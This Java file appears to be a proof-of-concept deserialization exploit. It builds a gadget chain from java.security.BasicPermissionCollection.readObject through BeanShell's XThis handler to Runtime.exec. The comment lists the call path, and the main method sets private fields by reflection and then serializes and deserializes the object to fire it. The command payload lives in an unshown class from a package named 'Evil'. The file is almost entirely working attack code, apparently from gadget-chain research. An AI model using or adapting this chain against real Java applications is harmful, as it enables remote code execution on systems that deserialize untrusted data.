package com.example.BeanShell;

import com.example.Evil.BeanShellCalc;
import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class POC_6 {

    /*** run with basicPerms.jar
     * <java.security.BasicPermissionCollection: void readObject(java.io.ObjectInputStream)>
     * <bsh.XThis$Handler: java.lang.Object invoke(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <bsh.XThis$Handler: java.lang.Object invokeImpl(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <bsh.This: java.lang.Object invokeMethod(java.lang.String,java.lang.Object[])>
     * <bsh.This: java.lang.Object invokeMethod(java.lang.String,java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode,boolean)>
     * <bsh.BshMethod: java.lang.Object invoke(java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode)>
     * <bsh.BshMethod: java.lang.Object invoke(java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode,boolean)>
     * <bsh.Reflect: java.lang.Object invokeMethod(java.lang.reflect.Method,java.lang.Object,java.lang.Object[])>
     * <java.lang.Runtime: java.lang.Process exec(java.lang.String)>
     */

    public static void main(String[] args) throws Exception {
        InvocationHandler handler = BeanShellCalc.getHandler("hashCode");
        Map m = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class<?>[]{Map.class}, handler);

        Hashtable table = ReflectionUtil.makeTable(m);

        Class clz = Class.forName("java.security.BasicPermissionCollection");
        Object a = ReflectionUtil.createWithoutConstructor(clz);

        ReflectionUtil.setField(a, "perms", table);
        ReflectionUtil.setField(a, "all_allowed", true);
        ReflectionUtil.setField(a, "permClass", HashMap.class);

        SerializeUtil.deserialize(SerializeUtil.serialize(a));

    }
}
